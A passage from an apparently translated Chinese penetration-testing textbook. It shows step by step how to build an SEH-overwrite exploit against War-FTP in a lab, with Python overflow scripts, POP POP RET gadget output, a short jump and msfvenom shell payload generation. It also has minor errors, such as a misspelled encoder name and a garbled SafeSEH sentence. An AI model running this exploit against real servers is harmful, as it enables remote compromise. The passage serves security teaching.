  \ 150 字符的模式，并替换了 ❶ 处的 `A` 字符串。接下来，在 Immunity Debugger 中重启 FTP，并再次运行利用程序。如 图 18-6\
  \ 所示，SEH 被 `4131741` 覆盖。\n\n![使用 Mona 的模式覆盖了 SEH](img/httpatomoreillycomsourcenostarchimages2030550.png.jpg)图\
  \ 18-6. 使用 Mona 的模式覆盖了 SEH\n\n现在使用 `!mona findmsp` 命令找出是哪四个 `A` 覆盖了 SEH，如 图 18-7\
  \ 所示。\n\n![模式覆盖了 SEH](img/httpatomoreillycomsourcenostarchimages2030552.png.jpg)图\
  \ 18-7. 循环模式覆盖了 SEH\n\n\n\n\n\n如之前所述，`SEH` 条目是长度八字节的链表，由一个指向链中下一个 SEH 记录的指针和栈上处理程序的内存地址组成。如果我们能将\
  \ `ESP+8` 加载到 `EIP`，就可以执行某些 shellcode。遗憾的是，看起来在遇到 SEH 条目本身之前，我们似乎只有四个字节的空间可以操作，但让我们一次解决一个问题。我们需要找到一种到达我们\
  \ shellcode 的可行方法，然后再考虑如何让我们的 shellcode 适应到可用空间中。\n\n在继续之前，让我们验证我们的偏移量是正确的，如示例 18-3\
  \ 所示。\n\n### 示例 18-3. 验证覆盖偏移量\n\n```python\n#!/usr/bin/python\nimport socket\nbuffer\
  \ = \"A\" * 569 + \"B\" * 4 + \"C\" * 4 + \"D\" * 573 ❶\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  connect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\n\
  s.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\n\
  s.close()\n```\n\n编辑你的利用程序以发送 569 个 `A`，紧接着是 4 个 `B`，再接着是 4 个 `C`，最后在 ❶ 处用 573 个\
  \ `D` 完成这 1150 字节的攻击字符串。重启 War-FTP 并再次运行利用程序。我们在图 18-12 中看到 SEH 被我们的 4 个 `C` 覆盖了。\n\
  \n![SEH is overwritten by four Cs.](img/httpatomoreillycomsourcenostarchimages2030562.png.jpg)图\
  \ 18-12. SEH 被四个 Cs 覆盖。\n\n如果我们再次输入 shift-F9 将异常处理程序传递给崩溃的程序，War-FTP 在访问内存地址 `43434343`（我们的\
  \ `C`s）时会再次崩溃。现在跟踪栈中的 `ESP` 寄存器。如图 18-13 所示，`ESP+8` 指向一个填充了内存地址的地址，内容为四个 `B` 后面是我们的四个\
  \ `C`，然后是 `D`s。\n\n![ESP+8 is attacker controlled.](img/httpatomoreillycomsourcenostarchimages2030564.png.jpg)图\
  \ 18-13. ESP+8 被攻击者控制。\n\n我们的偏移量是正确的。现在要找到一种将执行流重定向到 `ESP+8` 的方法。遗憾的是，这次简单的 `JMP\
  \ ESP` 不够用了。\n\n## POP POP RET\n\n我们需要一条指令（或一组指令），允许我们将栈向下移动八字节，然后执行位于 `ESP+8` 内存地址的内容。为了确定我们需要的汇编指令，我们必须考虑栈的工作原理。\n\
  \n栈是一个后进先出（LIFO）结构。通常用食堂里的托盘堆来类比这个概念。食堂工作人员最后放在栈顶部的托盘，是食堂顾客首先拿取的那一个。将托盘加到栈中然后被顾客拿走的汇编命令等价物分别是\
  \ `PUSH` 和 `POP`。\n\n记住，`ESP` 指向当前栈帧的顶端（最低内存地址）。如果我们使用 `POP` 指令从栈中弹出一个条目（四个字节），`ESP`\
  \ 现在将指向 `ESP+4`。因此，如果我们连续执行两个 `POP` 指令，`ESP` 现在将指向 `ESP+8`，这正是我们所追求的。\n\n最后，为了将我们的执行流重定向到由攻击者控制的字符串，我们需要将\
  \ `ESP+8` 的值（在执行两次 `POP` 指令后，现在位于 `ESP` 中）加载到 `EIP`（下一个要执行的内存地址）。幸运的是，有一条指令可以做到这一点，即\
  \ `RET` 指令。根据设计，`RET` 取 `ESP` 寄存器的内容并加载到 `EIP` 中以便执行。\n\n如果我们能找到这三条指令，`POP <some\
  \ register>`、`POP <some register>`、`RET`（利用程序开发者通常简写为 `POP POP RET`），我们应该能够通过用 SEH\
  \ 覆盖为第一个 `POP` 指令的内存地址来重定向程序的执行。`ESP` 的内容将被弹出到指令指定的寄存器中。我们并不特别在意哪个寄存器获得了持有弹出数据的荣誉，只要它不是\
  \ `ESP` 本身即可。我们只关心消耗栈上的内容直到到达 `ESP+8`。\n\n接下来执行第二条 `POP` 指令。现在 `ESP` 指向原始的 `ESP+8`。然后执行\
  \ `RET` 指令，`ESP`（执行 SEH 时为 `ESP+8`）被加载到 `EIP` 中。回上一节，`ESP+8` 持有一个指向我们攻击者控制的字符串第\
  \ 569 字节的内存地址。\n\n### 注意\n\n与 `JMP ESP` 一样，我们并不强制要求找到 `POP POP RET` 指令。逻辑等价的操作，例如向\
  \ `ESP` 添加八字节后跟一个 `RET` 等）同样有效。\n\n尽管这种技术稍微复杂，但它与我们在第 17 章 中完成的保存返回指针溢出练习相似。我们正在劫持程序的执行并将其重定向到我们的\
  \ shellcode。现在我们需要在 War-FTP 或其可执行模块中找到 `POP POP RET` 指令的实例。\n\n## SafeSEH\n\n随着\
  \ SEH 覆盖攻击变得流行，微软想出了方法来阻止它们生效。其中一个例子是 SafeSEH。使用 SafeSEH 编译的程序会记录用于结构化异常处理的内存位置，这意味着尝试将执行重定向到带有\
  \ `POP POP RET` 指令的内存位置将通过 SafeSEH 检查。\n\n重要的一点是，即使 Windows SP2 及更高版本的 DLL 使用 SafeSEH\
  \ 编译，第三方软件无需实现这种缓解技术。如果 War-FTP 或其任何自定义 DLL 不使用 SafeSEH，我们可能就不需要处理这个问题。\n\n当我们使用\
  \ `!mona seh` 命令时，Mona 将确定哪些模块未使用 SafeSEH 编译以寻找 `POP POP RET` 指令，如图 18-14 所示。\n\n\
  ![Running the SEH command](img/httpatomoreillycomsourcenostarchimages2030566.png.jpg)图\
  \ 18-14. 在 Mona 中运行 SEH 命令。\n\n`!mona seh` 的结果被写入 `C:\\logs\\war-ftpd\\seh.txt`，如下：\n\
  \n```\n0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiiprint,ascii {PAGE_EXECUTE_\n\
  READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False,\nv4.2.6256\
  \ (C:\\Documents and Settings\\georgia\\Desktop\\MFC42.DLL)\n0x5f4021bf : pop ebx\
  \ # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [MFC42.DLL]\nASLR: False, Rebase:\
  \ False, SafeSEH: False, OS: False, v4.2.6256 (C:\\Documents\nand Settings\\georgia\\\
  Desktop\\MFC42.DLL)\n0x5f4580ca : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ}\
  \ [MFC42.DLL]\nASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256\
  \ (C:\\Documents\nand Settings\\georgia\\Desktop\\MFC42.DLL)\n0x00401f2 : pop edi\
  \ # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ}\n[war-ftpd.exe] ASLR: False,\
  \ Rebase: False, SafeSEH: False, OS: False, v1.6.5.0\n(C:\\Documents and Settings\\\
  georgia\\Desktop\\war-ftpd.exe)\n```\n\n\n\n\n在我们继续之前，请使用 `bp 0x5F4580CA` 在 `5F4580CA`\
  \ 处断点，如图 18-15 所示。\n\n![POP POP RET 处的断点](img/httpatomoreillycomsourcenostarchimages2030568.png.jpg)图\
  \ 18-15. `POP POP RET` 处的断点\n\n将之前漏洞程序中的四个 `C` 替换为小端格式的 `POP POP RET` 内存地址，如示例 18-4\
  \ 所示。\n\n示例 18-4. 用 `POP POP RET` 替换 SEH 覆盖\n\n```\n#!/usr/bin/python\nimport socket\n\
  buffer = \"A\" * 569 + \"B\" * 4 + \"\\xCA\\x80\\x45\\x5F\" + \"D\" * 573\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  connect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\n\
  s.send('USER ' + buffer  + '\\r\\n')\nresponse = s.recv(1024)\nprint response\n\
  s.close()\n```\n\n现在再次运行漏洞程序。如图 18-16 所示，程序再次崩溃，并且正如所预期的那样，SEH 被覆盖为 `5F4580CA`。\n\
  \n![SEH 被 POP POP RET 地址覆盖](img/httpatomoreillycomsourcenostarchimages2030570.png.jpg)图\
  \ 18-16. SEH 被 `POP POP RET` 地址覆盖\n\n输入 `shift-F9` 让程序跳过被覆盖的异常处理器。正如所预期的，我们命中了断点，如图\
  \ 18-17 所示。\n\n![我们命中了断点。](img/httpatomoreillycomsourcenostarchimages2030572.png.jpg)图\
  \ 18-17. 我们命中了断点。\n\nCPU 窗口（左上）显示下一个要执行的指令是 `POP POP RET`。按 `F7` 逐条执行指令，并在此过程中观察栈（右下角）的变化。你会看到在执行\
  \ `POP` 指令时，`ESP` 逐渐向更高的地址移动。如图 18-18 所示，当我们执行 `RET` 指令时，我们最终进入了攻击字符串，即指向 NSEH 记录的指针，该指针目前填充了四个\
  \ `B`。\n\n![执行流被重定向到你的攻击字符串。](img/httpatomoreillycomsourcenostarchimages2030574.png.jpg)图\
  \ 18-18. 执行流被重定向到你的攻击字符串。\n\n我们解决了第一个问题：我们已经程序的执行流重定向到了我们的攻击字符串。遗憾的是，如图 18-18 所示，在运行\
  \ SEH 覆盖地址 `5F4580CA` 之前我们只有四个可用字节。SEH 地址之后我们有一长串 `D` 字符串，但目前我们只有四个字节可以操作。\n\n##\
  \ 使用短跳转 (Using Short Jump)\n\n我们需要某种方式跳过返回地址并到达我们的 `D` 字符串，那里有足够的空间放置 shellcode。可以使用\
  \ `short jump` 汇编指令移动 `EIP` 一段距离。这种方法非常适合我们的需求，因为我们需要跳过 SEH 覆盖的四个字节。\n\n短跳转的十六进制表示为\
  \ `\\xEB <跳转长度>`。通过用两个字节填充短跳转指令 `\\xEB <跳转长度>` 以占据 SEH 覆盖前的四个字节，我们可以向前跳过六个字节。\n\n\
  编辑攻击字符串以包含短跳转，如示例 18-5 所示。\n\n示例 18-5. 添加短跳转\n\n```\n#!/usr/bin/python\nimport socket\n\
  buffer = \"A\" * 569 + \"\\xEB\\x06\" + \"B\" * 2 + \"\\xCA\\x80\\x45\\x5F\" + \"\
  D\" * 570\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\n\
  response = s.recv(1024)\nprint response\ns.send('USER ' + buffer  + '\\r\\n')\n\
  response = s.recv(1024)\ns.close()\n```\n\n如示例 18-5 所示，这次我们将 NSEH（之前的 `B`）替换为 `\\\
  xEB\\x06` + `B * 2`。在运行漏洞之前，在 `POP POP RET` 处重置断点，当命中断点时，逐行执行程序 (`F7`) 以观察发生了什么。现在\
  \ `POP POP RET` 之后我们有一个六字节的短跳转，如图 18-19 所示。\n\n![执行流被重定向到短跳转。](img/httpatomoreillycomsourcenostarchimages2030576.png.jpg)图\
  \ 18-19. 执行流被重定向到短跳转。\n\n现在按 `F7` 执行短跳转。如图 18-20 所示，短跳转成功跳过了 SEH 地址并将执行流重定向到攻击字符串的剩余部分（`D`s）。\n\
  \n![短跳转跳过了 SEH 覆盖。](img/httpatomoreillycomsourcenostarchimages2030578.png.jpg)图\
  \ 18-20. 短跳转跳过了 SEH 覆盖。\n\n## 选择负载 (Choosing a Payload)\n\n我们现在第二次重定向了执行流，到了更长的受控内存——这是\
  \ shellcode 的理想位置。现在使用 `msfvenom` 选择并生成负载，如下：\n\n```\nroot@kali:~ msfvenom -p windows/shell_tcp\
  \ -s 573 -b '\\x00\\x40\\x0a\\x0d'\n[*] x86/shata_ga_nai succeeded with size 368\
  \ (iteration=1)\nbuf = \"\\xbe\\xa5\\xfd\\x18\\xa6\\xd9\\xc6\\xd9\\x74\\x24\\xf4\\\
  x5f\\x31\\xc9\" +\n--snip--\n```\n\n记得告诉 `msfvenom` 使用 573 字节的最大大小，并排除用于 FTP 用户名的坏字符（bad\
